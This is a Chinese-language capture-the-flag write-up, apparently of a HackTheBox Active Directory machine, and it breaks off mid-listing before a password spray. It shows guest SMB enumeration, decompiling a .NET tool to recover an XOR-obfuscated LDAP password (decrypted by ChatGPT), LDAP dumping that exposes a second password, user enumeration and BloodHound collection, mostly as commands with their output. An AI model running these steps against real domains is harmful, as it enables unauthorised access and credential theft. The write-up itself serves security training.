<h3 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.174 -u guest -p &#x27;&#x27; --shares</span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.10.11.174    445    DC               [+] support.htb\guest: </span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Enumerated shares</span><br><span class="line">SMB         10.10.11.174    445    DC               Share           Permissions     Remark</span><br><span class="line">SMB         10.10.11.174    445    DC               -----           -----------     ------</span><br><span class="line">SMB         10.10.11.174    445    DC               ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.11.174    445    DC               C$                              Default share</span><br><span class="line">SMB         10.10.11.174    445    DC               IPC$            READ            Remote IPC</span><br><span class="line">SMB         10.10.11.174    445    DC               NETLOGON                        Logon server share </span><br><span class="line">SMB         10.10.11.174    445    DC               support-tools   READ            support staff tools</span><br><span class="line">SMB         10.10.11.174    445    DC               SYSVOL                          Logon server share </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有一个support-tools的共享目录，进去翻一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\10.10.11.174\\support-tools -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Jul 21 01:01:06 2022</span><br><span class="line">  ..                                  D        0  Sat May 28 19:18:25 2022</span><br><span class="line">  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022</span><br><span class="line">  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022</span><br><span class="line">  putty.exe                           A  1273576  Sat May 28 19:20:06 2022</span><br><span class="line">  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022</span><br><span class="line">  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022</span><br><span class="line">  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022</span><br><span class="line">  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022</span><br><span class="line"></span><br><span class="line">                4026367 blocks of size 4096. 965578 blocks available</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>啊这，几个都翻一下吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\10.10.11.174\\IPC$ -U guest    </span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_NO_SUCH_FILE listing \*</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br><span class="line">$ smbclient \\\\10.10.11.174\\NETLOGON -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br><span class="line">$ smbclient \\\\10.10.11.174\\SYSVOL -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">NT_STATUS_ACCESS_DENIED listing \*</span><br><span class="line">smb: \&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>好吧，还是把tools先下载下来看看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient \\\\10.10.11.174\\support-tools -U guest</span><br><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                   D        0  Thu Jul 21 01:01:06 2022</span><br><span class="line">  ..                                  D        0  Sat May 28 19:18:25 2022</span><br><span class="line">  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022</span><br><span class="line">  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022</span><br><span class="line">  putty.exe                           A  1273576  Sat May 28 19:20:06 2022</span><br><span class="line">  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022</span><br><span class="line">  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022</span><br><span class="line">  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022</span><br><span class="line">  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022</span><br><span class="line"></span><br><span class="line">                4026367 blocks of size 4096. 965578 blocks available</span><br><span class="line">smb: \&gt; prompt</span><br><span class="line">smb: \&gt; mget *</span><br><span class="line">getting file \7-ZipPortable_21.07.paf.exe of size 2880728 as 7-ZipPortable_21.07.paf.exe (676.7 KiloBytes/sec) (average 676.7 KiloBytes/sec)</span><br><span class="line">getting file \npp.8.4.1.portable.x64.zip of size 5439245 as npp.8.4.1.portable.x64.zip (1247.5 KiloBytes/sec) (average 965.5 KiloBytes/sec)</span><br><span class="line">getting file \putty.exe of size 1273576 as putty.exe (717.7 KiloBytes/sec) (average 923.2 KiloBytes/sec)</span><br><span class="line">getting file \SysinternalsSuite.zip of size 48102161 as SysinternalsSuite.zip (1783.5 KiloBytes/sec) (average 1544.2 KiloBytes/sec)</span><br><span class="line">getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (341.7 KiloBytes/sec) (average 1518.6 KiloBytes/sec)</span><br><span class="line">getting file \windirstat1_1_2_setup.exe of size 79171 as windirstat1_1_2_setup.exe (106.5 KiloBytes/sec) (average 1491.7 KiloBytes/sec)</span><br><span class="line">getting file \WiresharkPortable64_3.6.5.paf.exe of size 44398000 as WiresharkPortable64_3.6.5.paf.exe (2690.8 KiloBytes/sec) (average 1848.7 KiloBytes/sec)</span><br><span class="line">smb: \&gt; exit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这几个文件除了userinfo的那个文件不知道是啥，其他的都可以找到出处</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file UserInfo.exe </span><br><span class="line">UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</span><br></pre></td></tr></table></figure>
<h3 id="dnspy-analyst-exe-and-crack-encrypt-pass-with-chatgpt"><a href="#dnspy-analyst-exe-and-crack-encrypt-pass-with-chatgpt" class="headerlink" title="dnspy analyst exe and crack encrypt pass with chatgpt"></a>dnspy analyst exe and crack encrypt pass with chatgpt</h3><p>dnspy看一下<br>在<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/73436762/net-decompiler-and-editor-for-linux">stackoverflow</a>上翻到一个dnspy的代替品_<a href="">ILSpy</a><br>好吧，还是回归dnspy</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#如果只把exe文件拿出来运行的话会报错，需要将其他的dll和config文件也放进去才可以正常运行</span><br><span class="line">PS C:\Users\liw\desktop&gt; .\UserInfo.exe</span><br><span class="line"></span><br><span class="line">未经处理的异常:  System.IO.FileNotFoundException: 未能加载文件或程序集“CommandLineParser, Version=0.7.0.0, Culture=neutral, PublicKeyToken=null”或它的某一个依赖项。系统找不到指定的文件。</span><br><span class="line">   在 UserInfo.Program.Main(String[] args)</span><br><span class="line">   在 UserInfo.Program.&lt;Main&gt;(String[] args)</span><br></pre></td></tr></table></figure>
<p>dnspy打开可以看到<br><img src="/images/support1.png"><br><img src="/images/support2.png"><br>这里找到一个password</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">namespace UserInfo.Services</span><br><span class="line">&#123;</span><br><span class="line">	// Token: 0x02000006 RID: 6</span><br><span class="line">	internal class Protected</span><br><span class="line">	&#123;</span><br><span class="line">		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318</span><br><span class="line">		public static string getPassword()</span><br><span class="line">		&#123;</span><br><span class="line">			byte[] array = Convert.FromBase64String(Protected.enc_password);</span><br><span class="line">			byte[] array2 = array;</span><br><span class="line">			for (int i = 0; i &lt; array.Length; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span><br><span class="line">			&#125;</span><br><span class="line">			return Encoding.Default.GetString(array2);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		// Token: 0x04000005 RID: 5</span><br><span class="line">		private static string enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;;</span><br><span class="line"></span><br><span class="line">		// Token: 0x04000006 RID: 6</span><br><span class="line">		private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个我会吗。不会，哈哈哈，给gpt吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">这个 Protected 类的作用是对一个加密的密码进行解密并返回明文密码。</span><br><span class="line">下面是代码的详细解析：</span><br><span class="line"></span><br><span class="line">1. 代码结构</span><br><span class="line">这个类是 internal，意味着它只能在 UserInfo.Services 命名空间内部使用。</span><br><span class="line"></span><br><span class="line">getPassword() 方法是 static 的，意味着可以直接通过类名调用，不需要实例化对象。</span><br><span class="line"></span><br><span class="line">2. 关键逻辑：Base64 解码</span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">byte[] array = Convert.FromBase64String(Protected.enc_password);</span><br><span class="line">Protected.enc_password 是一个 Base64 编码 的字符串，代表一个已加密的密码。</span><br><span class="line"></span><br><span class="line">Convert.FromBase64String(...) 方法会将其解码成字节数组 array，即加密后的字节数据。</span><br><span class="line"></span><br><span class="line">3. 进行解密</span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">byte[] array2 = array;</span><br><span class="line">for (int i = 0; i &lt; array.Length; i++)</span><br><span class="line">&#123;</span><br><span class="line">	array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span><br><span class="line">&#125;</span><br><span class="line">解密步骤</span><br><span class="line">Protected.key 是一个字节数组，由字符串 &quot;armando&quot; 转换成 ASCII 编码字节数组：</span><br><span class="line"></span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">private static byte[] key = Encoding.ASCII.GetBytes(&quot;armando&quot;);</span><br><span class="line">也就是说，key 其实是：</span><br><span class="line"></span><br><span class="line">plaintext</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">[97, 114, 109, 97, 110, 100, 111]  // &quot;armando&quot; 的 ASCII 码</span><br><span class="line">遍历 array，对每个字节执行 异或运算（XOR）：</span><br><span class="line"></span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);</span><br><span class="line">array[i] 是加密的字节。</span><br><span class="line"></span><br><span class="line">Protected.key[i % Protected.key.Length] 通过取模操作，循环使用 &quot;armando&quot; 的字节。</span><br><span class="line"></span><br><span class="line">223 是额外的一个固定数值（类似于盐值），增加混淆难度。</span><br><span class="line"></span><br><span class="line">最后，把解密后的字节数组转换回字符串：</span><br><span class="line"></span><br><span class="line">csharp</span><br><span class="line">复制</span><br><span class="line">编辑</span><br><span class="line">return Encoding.Default.GetString(array2);</span><br><span class="line">这就是原始的密码。</span><br><span class="line"></span><br><span class="line">当然！我会用 C# 的逻辑来解密 enc_password，但我会在 Python 里实现它，这样我们可以直接运行并得到结果。</span><br><span class="line"></span><br><span class="line">解密逻辑</span><br><span class="line">Base64 解码 enc_password，得到加密的字节数组。</span><br><span class="line"></span><br><span class="line">XOR 逐字节解密：</span><br><span class="line"></span><br><span class="line">使用 &quot;armando&quot; 作为密钥。</span><br><span class="line"></span><br><span class="line">每个字节先与 key[i % key.Length] 进行异或，再与 223 进行异或。</span><br><span class="line"></span><br><span class="line">转换回字符串，得到明文密码。</span><br><span class="line"></span><br><span class="line">我现在来运行这个解密代码。</span><br><span class="line"></span><br><span class="line">解密后的密码是：</span><br><span class="line">nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</span><br><span class="line"></span><br><span class="line">如果这是你的真实密码，请确保它的安全，不要在公共场合泄露！如果你有其他需要，比如加密方式的优化或者更安全的存储方法，也可以告诉我 😊 ​</span><br></pre></td></tr></table></figure>
<p>附上gpt写的解密py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line"># 加密的 Base64 密文</span><br><span class="line">enc_password = &quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span><br><span class="line"></span><br><span class="line"># 解密密钥</span><br><span class="line">key = &quot;armando&quot;.encode(&quot;ascii&quot;)</span><br><span class="line"></span><br><span class="line"># 1. Base64 解码</span><br><span class="line">encrypted_bytes = base64.b64decode(enc_password)</span><br><span class="line"></span><br><span class="line"># 2. XOR 解密</span><br><span class="line">decrypted_bytes = bytearray(len(encrypted_bytes))</span><br><span class="line">for i in range(len(encrypted_bytes)):</span><br><span class="line">    decrypted_bytes[i] = encrypted_bytes[i] ^ key[i % len(key)] ^ 223</span><br><span class="line"></span><br><span class="line"># 3. 转换回字符串</span><br><span class="line">decrypted_password = decrypted_bytes.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)</span><br><span class="line">decrypted_password</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在上面还可以看到认证方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string password = Protected.getPassword();</span><br><span class="line">			this.entry = new DirectoryEntry(&quot;LDAP://support.htb&quot;, &quot;support\\ldap&quot;, password);</span><br><span class="line">			this.entry.AuthenticationType = AuthenticationTypes.Secure;</span><br><span class="line">			this.ds = new DirectorySearcher(this.entry);</span><br></pre></td></tr></table></figure>
<h3 id="ldap-enum-info"><a href="#ldap-enum-info" class="headerlink" title="ldap enum info"></a>ldap enum info</h3><p>尝试一下我们的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;</span><br><span class="line">LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)</span><br><span class="line">LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有效<br>翻一下ldap吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -H &#x27;ldap://10.10.11.174&#x27; -D ldap@support.htb -w &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -b &quot;DC=support,DC=htb&quot; | less</span><br><span class="line"></span><br><span class="line"># /搜索一下info信息，可以看到有意思的</span><br><span class="line"># support, Users, support.htb</span><br><span class="line">dn: CN=support,CN=Users,DC=support,DC=htb</span><br><span class="line">objectClass: top</span><br><span class="line">objectClass: person</span><br><span class="line">objectClass: organizationalPerson</span><br><span class="line">objectClass: user</span><br><span class="line">cn: support</span><br><span class="line">c: US</span><br><span class="line">l: Chapel Hill</span><br><span class="line">st: NC</span><br><span class="line">postalCode: 27514</span><br><span class="line">distinguishedName: CN=support,CN=Users,DC=support,DC=htb</span><br><span class="line">instanceType: 4</span><br><span class="line">whenCreated: 20220528111200.0Z</span><br><span class="line">whenChanged: 20220528111201.0Z</span><br><span class="line">uSNCreated: 12617</span><br><span class="line">info: Ironside47pleasure40Watchful</span><br><span class="line">memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb</span><br><span class="line">memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb</span><br><span class="line">uSNChanged: 12630</span><br><span class="line">company: support</span><br><span class="line">streetAddress: Skipper Bowles Dr</span><br><span class="line">name: support</span><br><span class="line">objectGUID:: CqM5MfoxMEWepIBTs5an8Q==</span><br><span class="line">userAccountControl: 66048</span><br><span class="line">badPwdCount: 0</span><br><span class="line">codePage: 0</span><br><span class="line">countryCode: 0</span><br><span class="line">badPasswordTime: 0</span><br><span class="line">lastLogoff: 0</span><br><span class="line">lastLogon: 0</span><br></pre></td></tr></table></figure>
<p>长得真像个密码，先留一下<br>枚举一下用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nxc ldap 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; --users</span><br><span class="line">LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)</span><br><span class="line">LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz </span><br><span class="line">LDAP        10.10.11.174    389    DC               [*] Enumerated 20 domain users: support.htb</span><br><span class="line">LDAP        10.10.11.174    389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               </span><br><span class="line">LDAP        10.10.11.174    389    DC               Administrator                 2022-07-20 01:55:56 0        Built-in account for administering the computer/domain      </span><br><span class="line">LDAP        10.10.11.174    389    DC               Guest                         2022-05-28 19:18:55 0        Built-in account for guest access to the computer/domain    </span><br><span class="line">LDAP        10.10.11.174    389    DC               krbtgt                        2022-05-28 19:03:43 0        Key Distribution Center Service Account                     </span><br><span class="line">LDAP        10.10.11.174    389    DC               ldap                          2022-05-28 19:11:46 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               support                       2022-05-28 19:12:00 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               smith.rosario                 2022-05-28 19:12:19 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               hernandez.stanley             2022-05-28 19:12:34 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               wilson.shelby                 2022-05-28 19:12:50 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               anderson.damian               2022-05-28 19:13:05 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               thomas.raphael                2022-05-28 19:13:21 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               levine.leopoldo               2022-05-28 19:13:37 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               raven.clifton                 2022-05-28 19:13:53 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               bardot.mary                   2022-05-28 19:14:08 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               cromwell.gerard               2022-05-28 19:14:24 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               monroe.david                  2022-05-28 19:14:39 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               west.laura                    2022-05-28 19:14:55 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               langley.lucy                  2022-05-28 19:15:10 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               daughtler.mabel               2022-05-28 19:15:26 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               stoll.rachelle                2022-05-28 19:15:42 0                                                                    </span><br><span class="line">LDAP        10.10.11.174    389    DC               ford.victoria                 2022-05-28 19:15:58 0                                                                    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>再尝试一下smb，可以的话遛狗</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.11.174 -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27;                                                        </span><br><span class="line">SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) </span><br><span class="line">SMB         10.10.11.174    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz </span><br><span class="line"></span><br><span class="line">$ bloodhound-python -d support.htb -u ldap -p &#x27;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&#x27; -ns 10.10.11.174 --zip                  </span><br><span class="line">INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)</span><br><span class="line">INFO: Found AD domain: support.htb</span><br><span class="line">INFO: Getting TGT for user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.support.htb:88)] [Errno -2] Name or service not known</span><br><span class="line">INFO: Connecting to LDAP server: dc.support.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains in the forest</span><br><span class="line">INFO: Found 2 computers</span><br><span class="line">INFO: Found 21 users</span><br><span class="line">INFO: Connecting to LDAP server: dc.support.htb</span><br><span class="line">INFO: Found 53 groups</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: Management.support.htb</span><br><span class="line">INFO: Querying computer: dc.support.htb</span><br><span class="line">INFO: Done in 00M 46S</span><br><span class="line">INFO: Compressing output into 20250403145630_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>导入到bloodhound里面（我导入到了bloodhoundCE里面，但是不知道为啥导入进去很慢，有时间看一下是什么问题，哦，nxc也可以直接–bloodhound）</p>
<p>这边把枚举出来的用户名导出来喷射一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 